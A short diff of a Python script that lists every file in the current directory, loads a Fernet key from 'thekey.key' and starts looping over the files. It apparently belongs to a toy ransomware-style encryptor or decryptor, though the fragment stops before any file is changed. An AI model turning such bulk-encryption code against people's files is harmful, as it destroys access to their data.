@@ -1,11 +1,5 @@
-#!/usr/bin/env python3
-
 import os
 from cryptography.fernet import Fernet
-
-
-#let's find some files
-
 
 files = []
 
@@ -17,10 +11,8 @@ for file in os.listdir():
 
 print(files)
 
-
 with open("thekey.key", "rb") as key:
     secretkey = key.read()
-
 
 for file in files:
     with open(file, "rb") as thefile:
